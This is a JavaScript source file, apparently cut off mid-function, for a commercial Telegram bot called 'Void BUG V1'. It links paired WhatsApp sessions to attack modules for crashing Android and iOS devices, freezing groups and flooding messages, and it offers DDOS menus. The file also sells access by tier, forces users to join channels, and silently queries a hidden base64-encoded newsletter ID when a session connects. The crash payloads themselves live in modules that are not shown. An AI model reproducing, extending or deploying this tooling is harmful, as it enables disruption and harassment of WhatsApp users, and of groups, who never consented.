/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 */

// --- GLOBAL ERROR HANDLING (must be FIRST, before any require) ---
function _writeCrashLog(label, err) {
    try {
        const line = '[' + new Date().toISOString() + '] ' + label + ': ' + (err && err.stack ? err.stack : String(err)) + '\n';
        process.stderr.write(line);
        require('fs').appendFileSync('./crash.log', line);
    } catch (_) {}
}
process.on('uncaughtException', (err) => { _writeCrashLog('uncaughtException', err); });
process.on('unhandledRejection', (reason) => { _writeCrashLog('unhandledRejection', reason); });
process.on('SIGTERM', () => {});
process.on('SIGINT', () => {});

process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "918293007159"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")
const { log } = require("@sabir7718/log")

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

// ========== ACCESS SYSTEM ==========

const REQUIRED_CHANNELS = [
    { 
        username: '@certifiedloner_16', 
        id: null,
        displayName: ' JOIN VOID DONAIN'
    },
    { 
        username: '@void_support_01', 
        id: null,
        displayName: 'VOID SUPPORT CH'
    },
    { 
        username: '@the_voidchat', 
        id: null,
        displayName: '🎯 JOIN GROUP'
    }
];

const ADMIN_IDS = new Set(['7828164131']);

function isAdmin(userId) {
    return ADMIN_IDS.has(userId.toString());
}

// ========== TERMS OF SERVICE AGREEMENT ==========

const TOS_DB_PATH = path.join(LoveDir, 'tos_agreed.json');

function loadTosDB() {
    if (!fs.existsSync(TOS_DB_PATH)) {
        return { users: {} };
    }
    try {
        return JSON.parse(fs.readFileSync(TOS_DB_PATH));
    } catch {
        return { users: {} };
    }
}

function saveTosDB(data) {
    fs.writeFileSync(TOS_DB_PATH, JSON.stringify(data, null, 2));
}

function hasAgreedTos(userId) {
    const db = loadTosDB();
    return db.users[userId.toString()] === true;
}

function agreeTos(userId) {
    const db = loadTosDB();
    db.users[userId.toString()] = true;
    saveTosDB(db);
}

function declineTos(userId) {
    const db = loadTosDB();
    delete db.users[userId.toString()];
    saveTosDB(db);
}

const TosKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '✅ I ACCEPT', callback_data: 'tos_accept' }, { text: '❌ I DECLINE', callback_data: 'tos_decline' }]
        ]
    }
};

async function sendTosMessage(botInstance, chatId) {
    const tosText = `╔══════════════════════════════════════╗
║     ☠️ Void  BUG V1 ☠️          ║
╚══════════════════════════════════════╝

📜 Void  BUG V1

🔥 RESULT:
This bot deploys advanced WhatsApp bug payloads designed to crash, freeze, or disrupt target devices and groups. Effects include app crashes, system lag, group invisibility, and device freezing.

💀 STRENGTH:
• Multi-platform attacks (Android & iOS)
• Group destruction capabilities
• Persistent crash loops
• Invisible message flooding
• DDOS attack tools
• Real-time deployment with no cooldown

⚠️ USERS MUST AGREE TO:

1. You will NOT use this bot for illegal purposes.
2. You take FULL RESPONSIBILITY for your actions.
3. The bot owner is NOT liable for any damages caused.
4. You will NOT target innocent users without consent.
5. You understand this tool is for EDUCATIONAL & TESTING purposes only.
6. Violation of these terms will result in PERMANENT BAN.
 
🚨 IMPORTANT:
By clicking "I ACCEPT", you confirm you have read and agree to ALL terms above. If you decline, you will be fucked from the bot.

👤 Owner: @certifiedloner_16`;

    await botInstance.sendMessage(chatId, tosText, {
        parse_mode: 'HTML',
        ...TosKeyboard
    });
}


// ========== NOTIFICATION FUNCTION ==========
async function notifyAllUsers(botInstance, title, message, type = 'info') {
    const userFile = path.join(LoveDir, 'user.json');
    if (!fs.existsSync(userFile)) return;
    
    const users = JSON.parse(fs.readFileSync(userFile));
    let success = 0;
    let failed = 0;
    
    const emoji = type === 'success' ? '✅' : (type === 'warning' ? '❌' : '🔔');
    const finalMessage = `${emoji} ${title}\n\n${message}`;
    
    for (const user of users) {
        try {
            await botInstance.sendMessage(user.id, finalMessage, { parse_mode: 'HTML' });
            success++;
            await delay(50);
        } catch(err) {
            failed++;
        }
    }
    
    log('info', 'NOTIFICATION', `Sent to ${success} users, failed: ${failed}`);
    return { success, failed };
}

async function checkForceChannels(botInstance, userId) {
    try {
        for (const channel of REQUIRED_CHANNELS) {
            let chatMember;
            try {
                chatMember = await botInstance.getChatMember(channel.username, userId);
            } catch (e) {
                try {
                    const chat = await botInstance.getChat(channel.username);
                    channel.id = chat.id;
                    chatMember = await botInstance.getChatMember(chat.id, userId);
                } catch (e2) {
                    continue;
                }
            }
            if (!chatMember) continue;
            const validStatuses = ['creator', 'administrator', 'member', 'restricted'];
            if (!validStatuses.includes(chatMember.status)) {
                return false;
            }
        }
        return true;
    } catch (error) {
        return true;
    }
}

async function sendForceJoinMessage(botInstance, chatId) {
    const channelButtons = REQUIRED_CHANNELS.map(ch => ({ text: `📢 ${ch.displayName}`, url: `https://t.me/${ch.username.replace('@', '')}` }));
    const rows = [];
    for (let i = 0; i < channelButtons.length; i += 2) {
        rows.push(channelButtons.slice(i, i + 2));
    }
    rows.push([{ text: '✅ I Have Joined', callback_data: 'force_join_check' }]);
    const forceJoinKeyboard = { reply_markup: { inline_keyboard: rows } };
    await botInstance.sendMessage(chatId, 
        `╔═══════════════════════╗
║  ☠️ Void  BUG V1 ☠️  ║
╚═══════════════════════╝\n\n☠️🔥 OUR PREMIMUM BUG BOT🔥☠️\n════════════════════\n❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐚𝐥𝐥 𝐭𝐡𝐞 𝐥𝐢𝐧𝐤𝐬 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤 𝐭𝐡𝐞 𝐛𝐨𝐭\n\n⚡ JOIN MAIN CHENNAL\n🔥 JOIN GROUP\n🎯 AD TRICKS`,
        { parse_mode: 'HTML', ...forceJoinKeyboard }
    );
}

async function checkGlobalAccess(botInstance, msg, commandName) {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    if (isAdmin(userId)) return true;
    
    const channelsJoined = await checkForceChannels(botInstance, userId);
    if (!channelsJoined) {
        await sendForceJoinMessage(botInstance, chatId);
        return false;
    }
    
    return true;
}


// ========== END ACCESS SYSTEM ==========

const {
    spawn
} = require('child_process');
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();

const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📢 Join Channel', url: config.channel }, { text: '📱 Follow WhatsApp', url: config.waChannel || 'https://whatsapp.com' }],
            [{ text: '✅ Check Membership', callback_data: 'check_membership' }]
        ]
    }
};

const protectionMessage = `❌ You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
    if (userId.toString() === adminId.toString()) return true;
    if (!chId && !grId) return true;
    try {
        let inChannel = true;
        let inGroup = true;
        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];

        if (chId) {
            const channelMember = await botInstance.getChatMember(chId, userId);
            inChannel = validStatuses.includes(channelMember.status);
        }

        if (grId) {
            const groupMember = await botInstance.getChatMember(grId, userId);
            inGroup = validStatuses.includes(groupMember.status);
        }

        return inChannel && inGroup;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message);
        return true;
    }
}

const SYLoves = `./SY/S7/`

function safeRequire(mod) {
    try { return require(mod); } catch(e) { console.error(`[WARN] Could not load module: ${mod} — ${e.message}`); return {}; }
}

const stickerLogic = safeRequire(SYLoves + 'StickerCrash');
const CallLogic = safeRequire(SYLoves + 'CallCrash');
const IosLogic = safeRequire(SYLoves + 'IosInvisible');
const XgcLogic = safeRequire(SYLoves + 'Xgc');
const gcFrzLogic = safeRequire(SYLoves + 'gcFrz');
const crashjamLogic = safeRequire(SYLoves + 'crashjam');
const killsystemLogic = safeRequire(SYLoves + 'killsystem');
const testlogic = safeRequire(SYLoves + 'test');
const goneforceLogic = safeRequire(SYLoves + 'gone-force');
const familyproblemLogic = safeRequire(SYLoves + 'familyproblem');
const iosbreakLogic = safeRequire(SYLoves + 'IOSBREAK');
const R9XLogic = safeRequire(SYLoves + 'R9X');

const notauthorized = '🚫 You are not authorized to use this command.';

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    const seconds = Math.floor((diff / 1000) % 60);
    return `${days}ᴅ ${hours}ʜ ${minutes}ᴍ ${seconds}s`;
}

const SY_DIVIDER = '𓂀════════════════════════════════𓂀';

function buildHomeCaption(name, uptime, status, botName) {
    return `${SY_DIVIDER}\n\n` +
        `☀️ ɢᴏᴏᴅ ᴅᴀʏ, ${name}!\n\n` +
        `ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ${botName}\n\n` +
        `${SY_DIVIDER}\n\n` +
        `┃┌─〔 ʙᴏᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ 〕\n` +
        `┃ ⟦⟐⟧ ʙᴏᴛ ɴᴀᴍᴇ : ${botName}\n` +
        `┃ ⟦⟐⟧ ᴜᴘᴛɪᴍᴇ : ${uptime}\n` +
        `┃ ⟦⟐⟧ sᴛᴀᴛᴜs : ${status}\n` +
        `┃ ⟦⟐⟧ ᴛᴀʀɢᴇᴛ : ${name}\n` +
        `┃ ⟦⟐⟧ ᴍᴏᴅᴇ : VOID_EQUALIZER\n` +
        `┃└────────────\n\n` +
        `${SY_DIVIDER}`;
}

function buildCmdPage(emoji, title, cmds) {
    const lines = cmds.map(c => `┃  <code>${c}</code>`).join('\n');
    return `${SY_DIVIDER}\n\n${emoji} ${title}\n\n${SY_DIVIDER}\n\n${lines}\n\n${SY_DIVIDER}`;
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return {
        tokens: [],
        premium: [],
        resellers: []
    };

    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);

        if (Array.isArray(parsed)) {
            return {
                tokens: parsed,
                premium: [],
                resellers: []
            };
        }

        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return {
            tokens: [],
            premium: [],
            resellers: []
        };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 You are not authorized to use this command.\n\n📩 Please contact the developer to buy: ${config.S7}\n\n💰 Price/Dam:\n✅ Permanent Access: 15$ | 20k\n✅ Permanent Resell: 30$ | 41k\n✅ Script (No Encryption, 100%): 50$ | 70k`, {
            parse_mode: 'HTML'
        }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

// ========== EPIC CATEGORY MENUS ==========

const MainMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '🐛 ANDROID', callback_data: 'android_menu' }, { text: '🍎 iOS', callback_data: 'ios_menu' }],
            [{ text: '👥 GROUP', callback_data: 'group_menu' }, { text: '💥 DDOS', callback_data: 'ddos_menu' }],
            [{ text: '⚙️ MISC', callback_data: 'misc_menu' }, { text: '📢 CHANNEL', url: `${config.channel}` }]
        ]
    }
};

const AndroidMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '💥 crashjam', callback_data: 'cmd_crashjam' }, { text: '🗑️ trashsystem', callback_data: 'cmd_trashsystem' }],
            [{ text: '📱 crashdroid', callback_data: 'cmd_crashdroid' }, { text: '⚰️ killsystem', callback_data: 'cmd_killsystem' }],
            [{ text: '💳 goneforce', callback_data: 'cmd_goneforce' }, { text: '👪 familyproblem', callback_data: 'cmd_familyproblem' }],
            [{ text: '🌀 r9x', callback_data: 'cmd_r9x' }],
            [{ text: '🔙 BACK', callback_data: 'main_menu' }]
        ]
    }
};

const IosMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '👻 hidenseek', callback_data: 'cmd_hidenseek' }, { text: '🎭 iosinvisible', callback_data: 'cmd_iosinvisible' }],
            [{ text: '🍎 iosbreak', callback_data: 'cmd_iosbreak' }],
            [{ text: '🔙 BACK', callback_data: 'main_menu' }]
        ]
    }
};

const GroupMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '💀 trashsysgp', callback_data: 'cmd_trashsysgp' }, { text: '⚡ xgroup', callback_data: 'cmd_xgroup' }],
            [{ text: '🔪 killgc', callback_data: 'cmd_killgc' }, { text: '❄️ groupfriz', callback_data: 'cmd_groupfriz' }],
            [{ text: '👑 gcpromote', callback_data: 'cmd_gcpromote' }, { text: '👑 gcdemote', callback_data: 'cmd_gcdemote' }],
            [{ text: '🚫 gcban', callback_data: 'cmd_gcban' }, { text: '➕ gcadd', callback_data: 'cmd_gcadd' }],
            [{ text: '📋 listgc', callback_data: 'cmd_listgc' }, { text: '🆔 groupid', callback_data: 'cmd_groupid' }],
            [{ text: '🔙 BACK', callback_data: 'main_menu' }]
        ]
    }
};

const DdosMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '🔥 DDOS ATTACK', callback_data: 'cmd_ddos' }],
            [{ text: '🔙 BACK', callback_data: 'main_menu' }]
        ]
    }
};

const MiscMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📞 reqpair', callback_data: 'cmd_reqpair' }, { text: '🗑️ delpair', callback_data: 'cmd_delpair' }],
            [{ text: '⭐ addprem', callback_data: 'cmd_addprem' }, { text: '❌ delprem', callback_data: 'cmd_delprem' }],
            [{ text: '👑 addresell', callback_data: 'cmd_addresell' }, { text: '👑 delresell', callback_data: 'cmd_delresell' }],
            [{ text: '🔑 addtoken', callback_data: 'cmd_addtoken' }, { text: '🔑 deltoken', callback_data: 'cmd_deltoken' }],
            [{ text: '📋 listprem', callback_data: 'cmd_listprem' }, { text: '📋 listresell', callback_data: 'cmd_listresell' }],
            [{ text: '👥 listuser', callback_data: 'cmd_listuser' }, { text: '🎫 mytoken', callback_data: 'cmd_mytoken' }],
            [{ text: '🔙 BACK', callback_data: 'main_menu' }]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {}
}

async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
  try {
    let authPath;
    if (ownerId) {
        authPath = `./Love/${ownerId}/Auths/${number}`;
    } else {
        authPath = `./Love/auth/${chatId}/${number}`;
    }

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, {
            recursive: true
        });
    }

    const msgRetryCounterCache = new NodeCache();
    let version;
    try {
        ({ version } = await fetchLatestBaileysVersion());
    } catch (e) {
        version = [2, 3000, 1015901307];
        log('warn', 'WhatsApp', `fetchLatestBaileysVersion failed, using fallback: ${e.message}`);
    }
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({
            level: 'silent'
        }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }).child({
                level: "fatal"
            })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            return "";
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `VOIDBUGV1`);
            await S7.sendMessage(chatId, `╭──────「 VOIDBUGV1 」──────╮\n│➻ Number: ${number}\n│➻ Code: <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, {
                parse_mode: 'HTML'
            });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            try {
                await SYLoveMeOk(SYxS7);
            } catch (e) {}
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({
                sock: SYxS7,
                num: number
            });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `✅ WhatsApp Connected!\nNumber: ${number}.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false).catch(e => log('error', 'WhatsApp', `Reconnect failed: ${e.message}`));
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `❌ WhatsApp Logged Out\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});

                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, {
                    recursive: true,
                    force: true
                });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ Connection Closed\nNumber: ${number}\nReason: ${reason}`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }
    });
  } catch (err) {
      log('error', 'WhatsApp', `StartLovingSY crashed for ${number}: ${err.message}`);
  }
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true).catch(e => log('error', 'SYSTEM', `AutoReconnect failed for ${number}: ${e.message}`));
                    await delay(3000);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ Token Error\n\nYour bot token is not working.\nReason: <code>${errorMsg}</code>\n\nToken has been removed automatically.`, {
                    parse_mode: 'HTML'
                }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) {
        return 'OWNER';
    }
    if (db.resellers.includes(love.toString())) {
        return 'RESELLER';
    }
    if (db.premium.includes(love.toString())) {
        return 'PREMIUM';
    }
    return 'FREE USER';
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃ 🔥 see you in hell 🔥\n┃ ⚡ TARGET: ${cleanTarget}\n┃ 💀 STATUS: DEPLOYING PAYLOAD ATTACKS\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, {
            polling: true
        });
        let db = getDB();
        let tokenData = db.tokens.find(t => t.token === token);

        let botConfig = {
            channel: config.channel,
            group: config.group,
            logo: config.logo,
            botName: config.bot,
            ownerContact: config.S7,
            protection: false,
            channelId: config.channelId,
            groupId: config.groupId
        };

        if (tokenData && tokenData.config) {
            if (tokenData.config.channel) botConfig.channel = tokenData.config.channel;
            if (tokenData.config.group) botConfig.group = tokenData.config.group;
            if (tokenData.config.logo) botConfig.logo = tokenData.config.logo;
            if (tokenData.config.botName) botConfig.botName = tokenData.config.botName;
            if (tokenData.config.ownerContact) botConfig.ownerContact = tokenData.config.ownerContact;
            if (tokenData.config.protectionState !== undefined) botConfig.protection = tokenData.config.protectionState;
            if (tokenData.config.channelId) botConfig.channelId = tokenData.config.channelId;
            if (tokenData.config.groupId) botConfig.groupId = tokenData.config.groupId;
        }

        const botOwnerId = tokenData ? tokenData.owner : config.adminId;
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7).catch(e => log('error', 'SYSTEM', `AutoLovingWithSY failed: ${e.message}`));
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function getJoinKeyboard() {
            return {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📢 Join Channel', url: botConfig.channel }],
                        [{ text: '👥 Join Group', url: botConfig.group }],
                        [{ text: '📱 Follow WhatsApp', url: config.waChannel || 'https://whatsapp.com' }],
                        [{ text: '✅ Check Membership', callback_data: 'check_membership' }]
                    ]
                }
            };
        }

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];

            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);

                if (commands.includes(cmd)) {
                    const chatId = msg.chat.id;
                    const userId = msg.from.id;

                    const hasGlobalAccess = await checkGlobalAccess(S7, msg, cmd);
                    if (!hasGlobalAccess) return;
                    
           // Check TOS agreement for all commands except start/menu
                    if (cmd !== 'start' && cmd !== 'menu') {
                        if (!hasAgreedTos(userId)) {
                            await sendTosMessage(S7, chatId);
                            return;
                        }
                    }

                    if (botConfig.protection && cmd !== 'checkmembership') {
                        const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                        if (!isMember) {
                            const protectMsg = `❌ Access Denied!\n\nYou must join our Channel & Group to use this bot.\n\n👤 Owner: ${botConfig.ownerContact}\nClick "Check Membership" after joining.`;

                            return S7.sendMessage(chatId, protectMsg, {
                                parse_mode: 'HTML',
                                ...getJoinKeyboard()
                            });
                        }
                    }

                    try {
                        const name = msg.from.first_name || "Unknown";
                        log('command', name, msg.text);
                        
                        // Track command usage
                        try {
                            const cmdLogPath = path.join(LoveDir, 'cmd_logs.json');
                            let cmdLogs = {};
                            if (fs.existsSync(cmdLogPath)) {
                                cmdLogs = JSON.parse(fs.readFileSync(cmdLogPath));
                            }
                            cmdLogs[userId] = (cmdLogs[userId] || 0) + 1;
                            fs.writeFileSync(cmdLogPath, JSON.stringify(cmdLogs, null, 2));
                        } catch(e) {}
                        
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                    }
                }
            });
        }

         // ========== START COMMAND WITH EPIC INTERFACE ==========
        SYLoVe(['start', 'menu'], async (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();
            const userId = msg.from.id.toString();

            // Save user to database
            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }
            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({
                    id: chatId,
                    name: name,
                    date: new Date().toLocaleString()
                });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }

            // Check if user has access first
            const channelsJoined = await checkForceChannels(S7, userId);
            const userIsAdmin = ADMIN_IDS.has(userId);

            const hasAccess = userIsAdmin || channelsJoined;

            if (!hasAccess) {
                await sendForceJoinMessage(S7, chatId);
                return;
            }

            // Check if user has agreed to TOS
            if (!hasAgreedTos(userId)) {
                await sendTosMessage(S7, chatId);
                return;
            }

            // User has access AND agreed to TOS — show main menu
            const love = msg.from.id.toString();
            const status = GetSYLoVe(love);
            const captionText = buildHomeCaption(name, uptime, status, botConfig.botName);

            S7.sendPhoto(chatId, botConfig.logo, {
                caption: captionText,
                parse_mode: 'HTML',
                ...MainMenu
            }).catch(() => {
                S7.sendMessage(chatId, captionText, { parse_mode: 'HTML', ...MainMenu });
            });
        });

        // ========== ADMIN COMMANDS ==========
        
        
        // ========== UPDATED FREETRIAL COMMANDS WITH NOTIFICATIONS ==========
        
        
        // ========== STATS COMMANDS ==========
        
        SYLoVe('stats', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            
            if (!isAdmin(userId)) return S7.sendMessage(chatId, notauthorized);
            
            const userFile = path.join(LoveDir, 'user.json');
            let totalUsers = 0;
            if (fs.existsSync(userFile)) {
                totalUsers = JSON.parse(fs.readFileSync(userFile)).length;
            }
            
            let totalSessions = 0;
            for (const cid in waSessions) totalSessions += waSessions[cid]?.length || 0;
            
            S7.sendMessage(chatId, 
                `📊 BOT STATS\n\n` +
                `Users: ${totalUsers}\n` +
                `WA Sessions: ${totalSessions}`,
                { parse_mode: 'HTML' }
            );
        });
        
        SYLoVe('topusers', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            
            if (!isAdmin(userId)) return S7.sendMessage(chatId, notauthorized);
            
            const cmdLogPath = path.join(LoveDir, 'cmd_logs.json');
            let cmdLogs = {};
            if (fs.existsSync(cmdLogPath)) {
                cmdLogs = JSON.parse(fs.readFileSync(cmdLogPath));
            }
            
            const sorted = Object.entries(cmdLogs).sort((a, b) => b[1] - a[1]).slice(0, 10);
            
            if (sorted.length === 0) return S7.sendMessage(chatId, 'No data yet.');
            
            let text = '🏆 TOP 10 USERS\n\n';
            for (let i = 0; i < sorted.length; i++) {
                const [uid, count] = sorted[i];
                let name = uid;
                try {
                    const chat = await S7.getChat(uid);
                    name = chat.first_name || uid;
                } catch(e) {}
                text += `${i+1}. ${name.substring(0, 15)}: ${count} cmds\n`;
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });
        
        // ========== USERS COMMAND (ADMIN ONLY) ==========
        
        SYLoVe('users', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            
            if (!isAdmin(userId)) return S7.sendMessage(chatId, notauthorized);
            
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '❌ No user database found.');
            }
            
            const users = JSON.parse(fs.readFileSync(userFile));
            
            const totalUsers = users.length;
            
            let userList = '👥 USERS LIST\n\n';
            let count = 1;
            
            for (const user of users) {
                let username = user.name || user.id;
                if (user.username) username = `@${user.username}`;
                
